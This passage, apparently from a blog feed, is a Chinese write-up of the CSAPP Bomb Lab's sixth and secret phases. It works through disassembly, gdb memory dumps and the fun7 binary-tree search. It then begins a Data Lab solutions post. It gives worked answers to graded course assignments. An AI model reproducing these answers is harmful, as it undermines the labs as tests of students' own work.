x 命令打印的字节数如下：</p>\n<pre><code>b - byte\nh - halfword (16-bit value)\nw - word (32-bit value)\ng - giant word (64-bit value)\n</code></pre>\n<p>所以数字从大到小的顺序应该是 <code>3 4 5 6 1 2</code> ，但是因为 <code>ecx</code>  的值是 <code>7 - 原来的值</code> ，所以原来的值应该是 <code>4 3 2 1 6 5</code> 。成功解除炸弹！</p>\n<blockquote>\n<p>重点：</p>\n<ol>\n<li>这个过程就是第 <code>ecx</code>  个数的 <code>rdx</code> （链表结点地址）存储在地址数组的第 <code>rsi</code>  位，实现了链表结点的重排序！</li>\n<li>最后记得第 <code>ecx</code>  个数 = 7 - 原来的值，所以我们解出了链表中元素的值后，还要用 7 - 它 来获得我们原来输入的数</li>\n</ol>\n</blockquote>\n<h2 id=\"secret-phase-分析\"><a class=\"markdownIt-Anchor\" href=\"#secret-phase-分析\">#</a> secret phase 分析:</h2>\n<p>对 <code>secret phase</code>  执行反汇编得到如下结果：</p>\n<pre><code>0000000000401242 &lt;secret_phase&gt;:\nseg1:\n  401242:\t53                   \tpush   %rbx\n  401243:\te8 56 02 00 00       \tcallq  40149e &lt;read_line&gt;\n  401248:\tba 0a 00 00 00       \tmov    $0xa,%edx\n  40124d:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401252:\t48 89 c7             \tmov    %rax,%rdi\n  401255:\te8 76 f9 ff ff       \tcallq  400bd0 &lt;strtol@plt&gt;\n  40125a:\t48 89 c3             \tmov    %rax,%rbx\n  40125d:\t8d 40 ff             \tlea    -0x1(%rax),%eax\n  401260:\t3d e8 03 00 00       \tcmp    $0x3e8,%eax\n  401265:\t76 05                \tjbe    40126c &lt;secret_phase+0x2a&gt;\n  401267:\te8 ce 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg2:\n  40126c:\t89 de                \tmov    %ebx,%esi\n  40126e:\tbf f0 30 60 00       \tmov    $0x6030f0,%edi\n  401273:\te8 8c ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401278:\t83 f8 02             \tcmp    $0x2,%eax\n  40127b:\t74 05                \tje     401282 &lt;secret_phase+0x40&gt;\n  40127d:\te8 b8 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401282:\tbf 38 24 40 00       \tmov    $0x402438,%edi\n  401287:\te8 84 f8 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40128c:\te8 33 03 00 00       \tcallq  4015c4 &lt;phase_defused&gt;\n  401291:\t5b                   \tpop    %rbx\n  401292:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>压入 <code>%rbx</code></li>\n<li>读入一行 -&gt; 估计结果存储在 rax 中，也就是字符串的起始位置</li>\n<li><code>edx = 0xa</code> ， <code>esi = 0</code> ， <code>rdi = rax</code></li>\n<li>调用 <code>strtol</code></li>\n<li><code>rbx = rax</code>  -&gt; rbx = 字符串转化出的数值</li>\n<li><code>eax = rax - 1</code></li>\n<li>如果 <code>eax &lt;= 0x3e8</code> ，跳转到 seg 2；否则炸弹爆炸</li>\n<li><code>esi = ebx</code> ， <code>edi = 0x6030f0</code> ，调用 <code>fun7</code></li>\n<li>如果 <code>eax == 0x2</code> ，跳转到 seg 3（炸弹解除），否则炸弹爆炸</li>\n</ol>\n<p>将其转化为 C 语言：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">secret_phase</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 压入 rbx</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    rax <span class=\"token operator\">=</span> call read_line</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    edx <span class=\"token operator\">=</span> <span class=\"token number\">0xa</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    esi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    rdi <span class=\"token operator\">=</span> rax</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    call strtol</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    rbx <span class=\"token operator\">=</span> rax</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    eax <span class=\"token operator\">=</span> rax <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token comment\">// 输入数字必须小于等于 1000</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x3e8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// seg2</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        esi <span class=\"token operator\">=</span> ebx</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        edi <span class=\"token operator\">=</span> <span class=\"token number\">0x6030f0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        call fun7</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">==</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            call bomb_explode</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        call bomb_explode</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们首先解读一下 <code>secret_phase</code> ：<br>\n一开始几个寄存器的值如下：</p>\n<pre><code>rax - read line 返回的字符串地址\nedx - 0xa\nesi - 0\nrdi - read line 返回的字符串地址\n</code></pre>\n<p>调用 <code>strtol</code>  后几个寄存器的值如下：</p>\n<pre><code>rax - strtol 返回的字符串转化出的数值\nrbx - strtol 返回的字符串转化出的数值\neax - 数值 - 1\n</code></pre>\n<p>如果该数值 - 1 &gt; 0x3e8 (1000)，炸弹爆炸，否则进入 seg 2。</p>\n<p>seg 2 中完成了如下工作：</p>\n<ol>\n<li><code>esi = strtol 返回的字符串转化出的数值</code> （这个数必须小于等于 1001）</li>\n<li><code>edi = 0x6030f0</code>  (一个地址)</li>\n<li>调用 <code>fun7</code></li>\n<li>如果 <code>fun7</code>  返回 2，退出，否则炸弹爆炸</li>\n</ol>\n<p>这其中调用了一个叫 <code>fun7</code>  的函数，其反汇编结果如下：</p>\n<pre><code>0000000000401204 &lt;fun7&gt;:\nseg1:\n  401204:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401208:\t48 85 ff             \ttest   %rdi,%rdi\n  40120b:\t74 2b                \tje     401238 &lt;fun7+0x34&gt;\n  40120d:\t8b 17                \tmov    (%rdi),%edx\n  40120f:\t39 f2                \tcmp    %esi,%edx\n  401211:\t7e 0d                \tjle    401220 &lt;fun7+0x1c&gt;\n  401213:\t48 8b 7f 08          \tmov    0x8(%rdi),%rdi\n  401217:\te8 e8 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  40121c:\t01 c0                \tadd    %eax,%eax\n  40121e:\teb 1d                \tjmp    40123d &lt;fun7+0x39&gt;\nseg2:\n  401220:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401225:\t39 f2                \tcmp    %esi,%edx\n  401227:\t74 14                \tje     40123d &lt;fun7+0x39&gt;\n  401229:\t48 8b 7f 10          \tmov    0x10(%rdi),%rdi\n  40122d:\te8 d2 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401232:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n  401236:\teb 05                \tjmp    40123d &lt;fun7+0x39&gt;\nseg3:\n  401238:\tb8 ff ff ff ff       \tmov    $0xffffffff,%eax\nseg4:\n  40123d:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401241:\tc3                   \tretq\n</code></pre>\n<p>根据反汇编可以看出 <code>%rdi</code> ( <code>0x6030f0</code> ) 和 <code>%esi</code>  (输入的数值) 是传入参数， <code>%eax</code>  是返回值。其中还包括了一次递归调用。 <code>fun7</code>  的 C 语言实现如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">fun7</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">//rsp 留出 8 个字节的空间</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rdi <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// seg3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        eax <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        edx <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>rdi</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>edx <span class=\"token operator\">&lt;=</span> esi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token comment\">// seg2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>edx <span class=\"token operator\">!=</span> esi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                rdi <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rdi <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                call fun7</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                eax <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> rax <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            rdi <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rdi <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            call fun7</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            eax <span class=\"token operator\">=</span> eax <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// seg4</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">//rsp 栈空间恢复</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>fun7</code>  的内容翻译成 C 语言是如下内容：</p>\n<ol>\n<li>如果传入的 <code>rdi = 0</code> ，那么返回 <code>0xffffffff</code></li>\n<li>否则， <code>edx</code>  的值为 <code>rdi</code>  指向地址的值。</li>\n<li>如果 <code>edx &gt; 传入的esi</code> ，rdi 跳转到下一个位置（左节点的值）（这里大概率又是个链表），返回 <code>2 * fun7()</code></li>\n<li>否则， <code>eax = 0</code> ，如果 <code>edx == 传入的esi</code> ，返回 0；否则就跳转到下下个位置（右节点的值），返回 <code>2 * fun7() + 1</code></li>\n</ol>\n<p>为什么能推测出来这里的左节点和右节点呢？我们在 <code>0x6030f0</code>  打印 32 个字节的值看看：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>这里有 n+8 和 n+16，可以看出来这也是两个地址。</p>\n<p>这里对 <code>fun7</code>  的要求是必须在传入地址的值为 <code>0x6030f0</code> ，输入的 <code>%esi &lt;= 1000</code>  的情况下返回 2。</p>\n<p>我们打印一下这个链表各个结点的值：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>我们打印它左节点 (node 21)：</p>\n<pre><code>(gdb) x/32bx 0x603110\n0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603128:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>再打印右节点 (node 22)：</p>\n<pre><code>(gdb) x/32bx 0x603130\n0x603130 &lt;n22&gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603138 &lt;n22+8&gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603140 &lt;n22+16&gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603148:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>现在的迷惑之处在于 <code>fun7</code>  到底返回的是什么东西。从 <code>fun7</code>  的内容来看，其主要目的是一直找到 <code>esi</code>  的值在二叉树中的位置。如果 <code>esi &lt; edx</code> ，就找左边那颗二叉树，返回 <code>2 * fun7()</code> ，否则就找右边那颗二叉树，返回 <code>2 * fun7() + 1</code> 。从 <code>0x6030f0</code>  这个位置开始找，最后 <code>fun7()</code>  必须返回 2。从我们之前学习数据结构的经验来说，如果一个结点的标号为 n，那么它的左孩子就是 2 _ n, 右孩子就是 2 _ n + 1。</p>\n<p>二叉树的结构如下：</p>\n<p><img data-src=\"fun7.png\" alt=\"fun7\"></p>\n<p>那么首先 <code>edx</code>  的值为根节点的地址，我们从根开始遍历，一直到 <code>%esi</code>  的值所在的位置。我们对每个结点进行排查，那么能让最后返回 2 的 <code>%esi</code>  只有 0x16 和 0x14。</p>\n<p>但是 <code>secret_phase</code>  在哪里启动呢？我们来看看！欸，在 <code>phase_defused</code>  中启动！我们看到在 <code>callq secret_phase</code>  前有这样一段代码：</p>\n<pre><code>  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n</code></pre>\n<p>这段汇编首先把一个看起来像地址的 <code>0x402520</code>  放进了 <code>%edi</code>  寄存器，然后调用 <code>puts</code> ，将 <code>eax</code>  设置为 0。我们来看看 <code>0x402520</code>  处放了啥：</p>\n<pre><code>(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>这个地址是否出现在别的地方呢？好像没有。但是这段代码后面还有一段：</p>\n<pre><code>  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n</code></pre>\n<p>这里又出现了一个新地址， <code>0x402558</code> ，我们来看看这里是啥：</p>\n<pre><code>(gdb) x/s 0x402558\n0x402558:       &quot;Congratulations! You've defused the bomb!&quot;\n</code></pre>\n<p>额，是恭喜我们拆除炸弹。。。</p>\n<p>我想这么看可能是看不出来的，那么我们来把 <code>phase_defused</code>  详细拆解看看 (nop 指令省去)：</p>\n<pre><code>00000000004015c4 &lt;phase_defused&gt;:\nseg1:\n  4015c4:\t48 83 ec 78          \tsub    $0x78,%rsp -&gt; 留出栈位置\n  4015c8:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  4015cf:\t00 00\n  4015d1:\t48 89 44 24 68       \tmov    %rax,0x68(%rsp) -&gt; *(rsp + 104) = rax\n  4015d6:\t31 c0                \txor    %eax,%eax -&gt; 将eax置0\n  4015d8:\t83 3d 81 21 20 00 06 \tcmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;\n  4015df:\t75 5e                \tjne    40163f &lt;phase_defused+0x7b&gt;\n  4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8\n  4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi\n  4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi\n  4015fa:\te8 f1 f5 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  4015ff:\t83 f8 03             \tcmp    $0x3,%eax\n  401602:\t75 31                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401604:\tbe 22 26 40 00       \tmov    $0x402622,%esi\n  401609:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  40160e:\te8 25 fd ff ff       \tcallq  401338 &lt;strings_not_equal&gt;\n  401613:\t85 c0                \ttest   %eax,%eax\n  401615:\t75 1e                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401617:\tbf f8 24 40 00       \tmov    $0x4024f8,%edi\n  40161c:\te8 ef f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\nseg2:\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\nseg3:\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  40164b:\t00 00\n  40164d:\t74 05                \tje     401654 &lt;phase_defused+0x90&gt;\n  40164f:\te8 dc f4 ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg4:\n  401654:\t48 83 c4 78          \tadd    $0x78,%rsp\n  401658:\tc3                   \tretq\n</code></pre>\n<p>其中 seg 3 和 4 主要是一些收尾工作（检查 <code>canary</code>  的值之类的），seg2 是打印恭喜字符串，其核心部分在 seg 1。</p>\n<p>seg 1 的工作如下：</p>\n<ol>\n<li>留出栈的位置，放置 <code>canary</code></li>\n<li>获取输入的字符串的个数，如果不等于 6，跳转到收尾工作</li>\n<li>设置以下几个值：<pre><code> 4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8 // r8 = rsp + 16\n 4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx // rcx = rsp + 12\n 4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx // rdx = rsp + 8\n 4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi // esi = 0x402619\n 4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi // edi = 0x603870\n</code></pre>\n这里 <code>0x402619</code>  是 <code>sscanf</code>  的格式化输入的字符串的保存地址：<pre><code>0x402619:       &quot;%d %d %s&quot;\n</code></pre>\n而 <code>0x603870</code>  是输入的字符串的保存地址：<pre><code>(gdb) x/s 0x603870\n 0x603870 &lt;input_strings+240&gt;:   &quot;&quot;\n</code></pre>\n</li>\n<li>调用 sscanf 获取输入字符串，其个数存储在 <code>%eax</code>  中，判断其是否等于 3，如果不是进入收尾工作</li>\n<li>接下来我们需要判断 <code>0x402622</code>  处的字符串和输入的字符串是否相等，该处的字符串为 <code>DrEvil</code> ，如果相等的话，打印如下指令，然后进入 secret phase:</li>\n</ol>\n<pre><code>(gdb) x/s 0x4024f8\n0x4024f8:       &quot;Curses, you've found the secret phase!&quot;\n(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>但是什么时候会 <code>sscanf</code>  到 <code>0x603870</code>  处呢？只有 <code>phase_3</code>  和 <code>phase_4</code>  调用了 <code>sscanf</code> ，且输入的字符串的地址都存储在 <code>$rdi</code>  中，我们对他们打断点进行分析看看：</p>\n<pre><code>Breakpoint 1, 0x0000000000400f43 in phase_3 ()\n(gdb) p $rdi\n$1 = 6305824\n(gdb) p /x $rdi\n$2 = 0x603820\n(gdb) n\nSingle stepping until exit from function phase_3,\nwhich has no line number information.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\nwarning: Source file is more recent than executable.\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb)\n91           * confuse people. */\n(gdb)\nHalfway there!\n94          phase_defused();\n(gdb)\n0 207\n95          printf(&quot;Halfway there!\\n&quot;);\n(gdb) n\n\nBreakpoint 2, 0x000000000040100c in phase_4 ()\n(gdb) p /x $rdi\n$3 = 0x603870\n</code></pre>\n<p>在 <code>phase_4</code>  中 <code>$rdi = 0x603870</code> ，这个字符串是在这里输入的！那么这里应该输入第三个字符串来触发 secret_phase，也就是 <code>DrEvil</code> ，并且 secret phase 的答案是 0x16 和 0x14。</p>\n<p>最后成功啦！</p>\n<pre><code>Welcome to my fiendish little bomb. You have 6 phases with\nwhich to blow yourself up. Have a nice day!\nPhase 1 defused. How about the next one?\nThat's number 2.  Keep going!\nHalfway there!\nSo you got that one.  Try this one.\nGood work!  On to the next...\nCurses, you've found the secret phase!\nBut finding it and solving it are quite different...\nWow! You've defused the secret stage!\nCongratulations! You've defused the bomb!\n</code></pre>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li><code>Phase 1 - 3</code>  还好</li>\n<li><code>Phase 3</code>  那个需要传入 10 进制数，而不是 16 进制，写答案的时候不要写错了</li>\n<li><code>Phase 4</code>  那个 <code>func</code>  没看出来是啥，蒙了个 <code>0 0</code>  过了，需要搞懂</li>\n<li><code>Phase 5</code>  一开始没想到给那几个 16 进制的值加偏移量，使其为合法的 <code>ASCII码</code> 字符，是后来加查了 1 个题解晓得的。</li>\n<li><code>Phase 6</code>  费大力气终于解决啦！当然我一开始没留意到是第 <code>ecx</code>  个数的 <code>rdx</code>  存储在地址数组的第 <code>rsi</code>  位，所以还以为链表的结点都是顺序排列的。解除 phase6 的经历也告诉我，看见汇编不要一开始上来就将它转化成 C 语言，要首先根据跳转目标对其进行分段，用流程图分析他的跳转，然后再将其拆解为各个小的过程（拆解的过程中尽量把循环放在一起，控制一下过程的规模），一步步的分析他，不要一上来就看题解 / 暴力反汇编。而且要留意题意！比如第 5 题那个 ASCII 码字符，第 6 题要把顺序转化为 <code>7 - 原来的值</code> ，这都是容易做错的地方。</li>\n<li><code>secret_phase</code>  顺利完结！二叉树的结构精妙极了！但是 <code>secret_phase</code>  的入口不好找，因为输入的字符串都在 <code>%rdi</code>  中，需要通过 <code>gdb</code>  查看哪个 phase 的 rdi 寄存器的值 = 0x603870，这点很难。</li>\n</ol>\n<h2 id=\"参考资料\"><a class=\"markdownIt-Anchor\" href=\"#参考资料\">#</a> 参考资料</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTE2MjM1NzQ=\">手把手教你拆解 CSAPP 的 炸弹实验室 BombLab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjEwNjg0NDU=\">CSAPP bomblab 隐藏关卡 secret_phase 拆弹记录</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 1-data lab 实验记录",
            "date_published": "2024-02-05T07:50:22.000Z",
            "content_html": "<p>部分的题目我参考了一下网上的内容（出处已注明），其他的均为自己实现（有的题目的实现过程可能会有些繁琐），部分 dlc 检测出来可能会报些 error，但是 btest 均能过。</p>\n<blockquote>\n<p>没有 TA 可太难了！自己实现了一天多，终于苟完了。不算完美，但也能看吧。</p>\n</blockquote>\n<h2 id=\"bitxor\"><a class=\"markdownIt-Anchor\" href=\"#bitxor\">#</a> bitXor</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * bitXor - x^y using only ~ and &amp;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Example: bitXor(4, 5) = 1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Legal ops: ~ &amp;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Max ops: 14</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Rating: 1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">bitXor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    * x + y = ~( ~x &amp; ~y)</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token 